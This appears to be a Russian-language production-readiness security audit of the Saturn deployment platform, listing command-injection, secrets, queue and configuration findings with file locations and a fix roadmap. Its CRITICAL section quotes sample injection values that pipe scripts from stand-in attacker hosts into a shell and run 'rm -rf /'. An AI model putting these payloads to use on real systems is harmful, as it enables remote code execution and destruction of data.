# Saturn Platform — Production Readiness Audit V4

**Дата:** 2026-02-22
**Статус:** 🔴 НЕ ГОТОВ к production
**Найдено:** 7 CRITICAL, 16 HIGH, 15 MEDIUM, 8 LOW

---

## 🔴 CRITICAL — Без фикса в прод нельзя

### CRIT-1. Command Injection в `LocalFileVolume` — RCE на VPS
- **Файл:** `app/Models/LocalFileVolume.php:175-231`
- **Проблема:** `fs_path` (пользовательский ввод) в `mkdir` без escapeshellarg. `chown`/`chmod` значения без валидации.
- **Вектор:** `fs_path = "/tmp; curl attacker.com/shell.sh | bash"` → RCE через SSH
- **Статус:** [x] Исправлено (commit pending)

### CRIT-2. Command Injection в `buildGitCheckoutCommand`
- **Файл:** `app/Models/Application.php:1925-1934`
- **Проблема:** `$target` в `git checkout $target` без escapeshellarg
- **Вектор:** webhook payload с `commit = "HEAD; rm -rf /"`
- **Статус:** [x] Исправлено (commit pending)

### CRIT-3. Command Injection в Nixpacks (build/start/install commands + env values)
- **Файл:** `app/Traits/Deployment/HandlesNixpacksBuildpack.php:288-331`
- **Проблема:** build_command в двойных кавычках (допускает `$(...)`), env values без экранирования
- **Вектор:** `build_command = "npm build && $(curl evil.com | sh)"` → RCE
- **Статус:** [x] Исправлено (commit pending)

### CRIT-4. `.env.production` — `APP_DEBUG=true`, `APP_ENV=local`
- **Файл:** `.env.production:4,11`
- **Проблема:** Полные stack traces в браузере, Telescope не скрывает данные
- **Статус:** [ ] Требует ручного фикса на VPS

### CRIT-5. Реальный API-ключ OpenAI в `.env.production`
- **Файл:** `.env.production:62`
- **Проблема:** Живой ключ `sk-proj-TmSkg5p...` требует немедленной ротации
- **Статус:** [ ] Требует ротации на platform.openai.com

### CRIT-6. Тривиальные secrets в production
- **Файл:** `.env.production:14-31`
- **Проблема:** `DB_PASSWORD=password`, `REDIS_PASSWORD=saturn`, `PUSHER_*=saturn`
- **Статус:** [ ] Требует ручного фикса на VPS

### CRIT-7. Jobs без `$tries`/`$timeout` — бесконечные retry
- **Файл:** `app/Jobs/UpdateSaturnJob.php`, `app/Jobs/ServerManagerJob.php`
- **Проблема:** Нет `$tries` (дефолт = ∞), нет `failed()`. Зависший ServerManagerJob блокирует мониторинг
- **Статус:** [x] Исправлено (commit pending)

---

## 🟠 HIGH — Фиксить до продакшна

### H-1. `git_branch` без escapeshellarg в `git ls-remote`
- **Файл:** `app/Traits/Deployment/HandlesGitOperations.php:70`
- **Статус:** [x] Исправлено (commit pending)

### H-2. `POST /servers` API требует ability `read` вместо `write`
- **Файл:** `routes/api.php:309`
- **Фикс:** Заменить `api.ability:read` → `api.ability:write`
- **Статус:** [x] Исправлено (commit pending)

### H-3. MongoDB/Redis/MariaDB пароли без шифрования в БД
- **Файлы:** `app/Models/StandaloneMongodb.php:68`, `StandaloneRedis.php:68`, `StandaloneMariadb.php:68`
- **Фикс:** Добавить `'encrypted'` cast для полей паролей
- **Статус:** [x] Исправлено (commit pending)

### H-4. Redis без AOF persistence — потеря jobs до 20 мин при рестарте
- **Файл:** `docker-compose.env.yml:104`
- **Фикс:** Добавить `--appendonly yes --appendfsync everysec`
- **Статус:** [x] Исправлено (commit pending)

### H-5. `retry_after = 3600` = `$timeout` у deploy job — race condition
- **Файл:** `config/queue.php:68`
- **Фикс:** `retry_after => 4200`
- **Статус:** [x] Исправлено (commit pending)

### H-6. Deploy job `$tries=3` без идемпотентности
- **Файл:** `app/Jobs/ApplicationDeploymentJob.php:66`
- **Фикс:** Добавить `$maxExceptions = 1`
- **Статус:** [x] Исправлено (commit pending)

### H-7. `StripeProcessJob` без `$timeout`
- **Файл:** `app/Jobs/StripeProcessJob.php`
- **Фикс:** Добавить `$timeout = 30` и `failed()` callback
- **Статус:** [x] Исправлено (commit pending)

### H-8. Backup encryption key в той же БД что и данные
- **Файл:** `app/Models/ScheduledDatabaseBackup.php:74`
- **Проблема:** Ключ шифрования бэкапа рядом с данными — "ключ под ковриком"
- **Статус:** [ ] Архитектурное решение — требует KMS

### H-9. `previous_keys` не настроен — ротация APP_KEY уничтожит все секреты
- **Файл:** `config/app.php`
- **Фикс:** Добавить `'previous_keys' => [...explode(',', env('APP_PREVIOUS_KEYS', ''))]`
- **Статус:** [x] Исправлено (commit pending)

### H-10. Sanctum token expiration = 365 дней
- **Файл:** `config/sanctum.php:49`
- **Фикс:** Уменьшить до 90 дней (129600 минут)
- **Статус:** [x] Исправлено (commit pending)

### H-11. `SESSION_SECURE_COOKIE` не задан → cookie по HTTP
- **Файл:** `.env.production`, `config/session.php:171`
- **Фикс:** `SESSION_SECURE_COOKIE=true` в env + safe default в config
- **Статус:** [ ] Требует ручного фикса на VPS (.env)

### H-12. SSH private keys в plaintext на диске
- **Файл:** `app/Models/PrivateKey.php:204`
- **Проблема:** Неизбежно для SSH, но нужна документация + ограничение прав директории
- **Статус:** [ ] Архитектурно неизбежно — задокументировано

### H-13. CORS `allowed_methods => ['*']`, `allowed_headers => ['*']`
- **Файл:** `config/cors.php:20-21`
- **Фикс:** Явные методы и заголовки
- **Статус:** [x] Исправлено (commit pending)

### H-14. SshMultiplexingHelper — `$muxSocket` без экранирования
- **Файл:** `app/Helpers/SshMultiplexingHelper.php:45,86`
- **Фикс:** `escapeshellarg($muxSocket)`
- **Статус:** [ ] Не исправлено

### H-15. Webhook null secret → HMAC с пустым ключом проходит
- **Файл:** `app/Http/Controllers/Webhook/Github.php:90`
- **Фикс:** `if (empty($webhook_secret)) { continue; }`
- **Статус:** [x] Исправлено (commit pending)

### H-16. `spatie/laravel-ray` в production dependencies
- **Файл:** `composer.json`
- **Фикс:** Перенести из `require` в `require-dev`
- **Статус:** [x] Исправлено (commit pending)

---

## 🟡 MEDIUM — Желательно до прода

### M-1. Health endpoint → HTTP 200 даже при degraded
- **Файл:** `app/Http/Controllers/Api/OtherController.php:222`
- **Фикс:** Вернуть HTTP 503 при degraded
- **Статус:** [ ] Не исправлено

### M-2. `application_deployment_queues.status` без индекса
- **Фикс:** Composite index `(application_id, status)`
- **Статус:** [ ] Не исправлено

### M-3. Telescope не скрывает `password`, `private_key` в request body
- **Файл:** `app/Providers/TelescopeServiceProvider.php:43`
- **Статус:** [ ] Не исправлено

### M-4. Notification jobs (4 шт.) без `$timeout` и `failed()`
- **Файлы:** `SendMessageToSlackJob`, `SendMessageToDiscordJob`, `SendMessageToTelegramJob`, `PushoverJob`
- **Статус:** [ ] Не исправлено

### M-5. `CheckHelperImageJob $timeout = 1000s` (16 мин для HTTP запроса)
- **Файл:** `app/Jobs/CheckHelperImageJob.php:17`
- **Фикс:** `$timeout = 30`
- **Статус:** [ ] Не исправлено

### M-6. WebSocket database channel auth — до 8 DB запросов в цепочке
- **Файл:** `routes/channels.php:51-74`
- **Статус:** [ ] Не исправлено

### M-7. Нет rate limiting на WebSocket events
- **Статус:** [ ] Не исправлено

### M-8. PrivateKey fingerprint check глобален при `currentTeam()=null`
- **Файл:** `app/Models/PrivateKey.php:380`
- **Статус:** [ ] Не исправлено

### M-9. `domains_by_server` — query-param uuid без team check
- **Файл:** `app/Http/Controllers/Api/ServersController.php:311`
- **Статус:** [ ] Не исправлено

### M-10. `/api/feedback` без rate-limiting
- **Файл:** `routes/api.php:53`
- **Статус:** [ ] Не исправлено

### M-11. MongoDB backup URL с паролем в shell-команде → попадает в логи
- **Файл:** `app/Jobs/DatabaseBackupJob.php:534`
- **Статус:** [ ] Не исправлено

### M-12. Bulk status updates без транзакции
- **Файл:** `app/Jobs/PushServerUpdateJob.php:431`
- **Статус:** [ ] Не исправлено

### M-13. CSP `unsafe-inline` для style-src
- **Файл:** `app/Http/Middleware/AddCspHeaders.php:39`
- **Статус:** [ ] Не исправлено

### M-14. Railway Dockerfile — `chmod 777`, без `USER`, без multi-stage
- **Файл:** `Dockerfile:81`
- **Статус:** [ ] Не исправлено

### M-15. Suspended users сохраняют API-доступ через токены
- **Файл:** `app/Http/Middleware/CheckUserStatus.php`
- **Статус:** [ ] Не исправлено

---

## ✅ Что сделано хорошо

- SSH-слой централизован через `SshMultiplexingHelper` + heredoc pattern
- `lockForUpdate()` + `DB::transaction()` для concurrent deploys
- Env vars пользователей зашифрованы (`encrypted` cast)
- SSH keys в БД зашифрованы
- CSRF + encrypted sessions + HttpOnly cookies
- CSP с per-request nonce для scripts
- Rate limiting на login (5/мин), 2FA, forgot-password, API
- Production Dockerfile — multi-stage, USER www-data
- WebSocket channels — все Private с team auth callbacks
- `hash_equals()` для webhook signature verification
- Health endpoint проверяет DB + Redis + Queue

---

## Roadmap

### День 1 — CRITICAL блокеры
1. [ ] CRIT-1, CRIT-2, CRIT-3: Command injection fixes (escapeshellarg + regex validation)
2. [ ] CRIT-4, CRIT-5, CRIT-6: .env.production hardening
3. [ ] CRIT-7: Jobs $tries/$timeout/failed()

### Неделя 1 — HIGH
4. [ ] H-1 → H-7: Security + queue fixes
5. [ ] H-8 → H-11: Crypto + config fixes
6. [ ] H-12 → H-16: Defense-in-depth

### Неделя 2 — MEDIUM
7. [ ] M-1 → M-5: Health + performance
8. [ ] M-6 → M-10: WebSocket + API
9. [ ] M-11 → M-15: Cleanup + hardening
